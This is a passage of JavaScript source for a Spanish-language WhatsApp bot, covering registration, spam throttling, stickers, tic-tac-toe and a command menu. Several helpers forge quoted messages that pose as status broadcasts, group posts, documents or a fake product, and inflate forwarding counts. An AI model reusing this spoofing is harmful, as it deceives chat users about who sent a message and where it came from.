		       } catch (err) { console.error(err)  }
 	       }

const fakethumb = (teks, yes) => {
            cnf.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./sticker/fake.jpeg'),quoted:mek,caption:yes})
        }
        const fakestatus = (teks) => {
            cnf.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Hola ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./sticker/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    },
                    contextInfo: {
                      "forwardingScore": 999, "isForwarded": true
                    }
                }
            })
        }
        const faketokoforwaded = (teks) => {
	anu = {
	  key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./sticker/thumb.jpeg`)
					},
					"title": `Hola ${pushname}, ${ucapanWaktu}`,
					"retailerId": "Confu bot",
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
	cnf.sendMessage(from, teks, text, {
	  quoted: anu,
	  contextInfo:{
	    "forwardingScore": 999, "isForwarded": true
	  }
	})
}

	const fspam = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"contactMessage": {
		"displayName": `${pushname} NO SPAM!!`,
		"vcard": 'BEGIN:VCARD\n' +
    		'Version:3.0\n' +
    		'TEL;type=CELL;type=VOICE;waid=51931655706:+51931655706\n' +
		'item1.X-ABLabel:Celular' +
    		'END:VCARD'
		}
		}
		}

        const fakegroup = (teks) => {
            cnf.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Hola ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./sticker/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }


const fdocu = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/cnf.jpeg')}}}
            


const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`media/cnf.jpeg`)} } }


const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./media/cnf.jpeg`)
					},
					"title": fake,
					"description": "🌸Watame-BOT🌸",
					"currencyCode": "USD",
					"priceAmount1000": "1000000000",
					"retailerId": "Confu",
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const uploadImages = (buffData, type) => {
    
    return new Promise(async (resolve, reject) => {
        const { ext } = await fromBuffer(buffData)
        const cmd = text.toLowerCase()
        const filePath = 'utils/tmp.' + ext
        const _buffData = type ? await resizeImage(buffData, false) : buffData
        fs.writeFile(filePath, _buffData, { encoding: 'base64' }, (err) => {
            if (err) return reject(err)
            console.log('Uploading image to telegra.ph server...')
            const fileData = fs.readFileSync(filePath)
            const form = new FormData()
            form.append('file', fileData, 'tmp.' + ext)
            fetch('https://telegra.ph/upload', {
                method: 'POST',
                body: form
            })
                .then(res => res.json())
                .then(res => {
                    if (res.error) return reject(res.error)
                    resolve('https://telegra.ph' + res[0].src)
                })
                .then(() => fs.unlinkSync(filePath))
                .catch(err => reject(err))
        })
    })
}

        const isImage = type == 'imageMessage'
        const isVideo = type == 'videoMessage'
        const isAudio = type == 'audioMessage'
        const isSticker = type == 'stickerMessage'
        const isContact = type == 'contactMessage'
        const isLocation = type == 'locationMessage'
        
	const isTexto = type == 'textMessage'
        
        typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = "Image"
        else if (isVideo) typeMessage = "Video"
        else if (isAudio) typeMessage = "Audio"
        else if (isSticker) typeMessage = "Sticker"
        else if (isContact) typeMessage = "Contact"
        else if (isLocation) typeMessage = "Location"
	else if (isTexto) typeMessage = "text"

			colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage') 



   if (itsMe){
     if(chats.toLowerCase() == `${prefix}self`){
       public = false
       cnf.sendMessage(from, `Success`, `ESTADO : UNO MISMO`)
     }
     if (chats.toLowerCase() == 'status'){
       cnf.sendMessage(from, `STATUS : ${public ? 'PUBLICO' : 'UNO MISMO'}`)
     }
   }
   
  if (!public){
    if (!mek.key.fromMe) return
  }
  

		if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
	
	    	if (isBanned && isCmd && !isOwner) {
		reply('*¡Has tenido demasiadas interacciones por hoy!*')
        	return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	}
	
		if (isCmd && isFiltered(from) && !isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return cnf.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nMas lento, espera 3 segundos para poder usar otros comandos.`, MessageType.text, {quoted: fspam})
		}
        
        	if (isCmd && isFiltered(from) && isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return cnf.sendMessage(from, `Por favor ${pushname}, espera 10 segundos para poder usar otros comandos, gracias.`, MessageType.text, {quoted: fspam})
		}
	   
	   
			function addMetadata(packname, author) {	
				if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./src/stickers/${name}.exif`)) return `./src/stickers/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	

				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	

				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	

				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
               
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./src/stickers/${name}.exif`, buffer, (err) => {	
					return `./src/stickers/${name}.exif`	
				})	

			}
			
			
			
			switch(command) {
			
							case prefix+'registrar':
							if (isBanned) return  reply(mess.banned)
                if (isRegistered) return  reply(ind.rediregis())
                if (!q.includes('|')) return  reply(ind.wrongf())
                const namaUser = q.substring(0, q.indexOf('|') - 0)
                const umurUser = q.substring(q.lastIndexOf('|') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return await reply('La edad debe ser un número!!')
                if (namaUser.length >= 30) return reply(`¿Por qué tu nombre es tan largo?`)
                if (umurUser > 40) return reply(`Tu edad es demasiado mayor, máximo 40 años`)
                if (umurUser < 12) return reply(`Eres demasiado joven, mínimo 12 años`)
                try {
					ppimg = await cnf.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
					daftarimg = await getBuffer(ppimg)
                veri = sender
                if (isGroup) {
                    addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    await cnf.sendMessage(from, daftarimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    addATM(sender)
                    addLevelingId(sender)
                    console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
                } else {
                    addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    await cnf.sendMessage(from, daftarimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    addATM(sender)
                    addLevelingId(sender)
                    console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
                }
				addFilter(from)
          break

			  
case prefix+'tictactoe':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroup) return reply(mess.only.group)

if (args.length < 1) return reply('Etiqueta a tu oponente ⚔️')
if (isTTT) return reply('Hay un juego en este grupo, espere')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta al objetivo del oponente')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
gilir = player2
id = from
ky_ttt.push({player1,player2,id,angka,gilir})
cnf.sendMessage(from, `*🎳 Iniciar un juego de Tictactoe 🎲*

[@${player2.split('@')[0]}] Te desafían a convertirte en un oponente del juego🔥
Escribe Y/N para aceptar o rechazar el juego.

Escriba ${prefix}delttt, para reiniciar los juegos grupales.`, text, {contextInfo: {mentionedJid: [player2]}})
addFilter(from)
          break
                                                                                
                case prefix+'delltictactoe':
                case prefix+'delttt':
     if (isBanned) return  reply(mess.banned)           
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('No hay juegos en este grupo')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Listo UwU')
addFilter(from)
          break			

			     case prefix+'menu':
		if (isBanned) return  reply(mess.banned)	       
if (!isRegistered) return reply(ind.noregis())		
                    wew = fs.readFileSync(`./media/cnf.jpeg`)
const sosGay = checkATMuser(sender)   
                                     lzain = ` ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╭✦┅╡ MENU PRINCIPAL ╞┅✦╮*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}tts*
*╟ ❒ ${prefix}attp*
*╟ ❒ ${prefix}sticker*
*╟ ❒ ${prefix}idiomas (tts)*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣NUEVOS*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}ban*
*╟ ❒ ${prefix}coinflip*
*╟ ❒ ${prefix}*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣MULTIMEDIA*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}toimg*
*╟ ❒ ${prefix}tomp3*
*╟ ❒ ${prefix}wpanime*
*╟ ❒ ${prefix}wallpaper*
*╟ ❒ ${prefix}play (audio)*
*╟ ❒ ${prefix}play2 (video)*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣NIVEL Y DINERO*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}yo*
*╟ ❒ ${prefix}cartera*
*╟ ❒ ${prefix}trabajar*
*╟ ❒ ${prefix}transferir @ | cantidad*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣OTAKU*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}loli*
*╟ ❒ ${prefix}yaoi*
*╟ ❒ ${prefix}poke*
*╟ ❒ ${prefix}waifu*
*╟ ❒ ${prefix}hinata*
*╟ ❒ ${prefix}avatar*
*╟ ❒ ${prefix}kanna*
*╟ ❒ ${prefix}anime*
*╟ ❒ ${prefix}sakura*
*╟ ❒ ${prefix}naruto*
*╟ ❒ ${prefix}waifu2*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣REACCIONES*
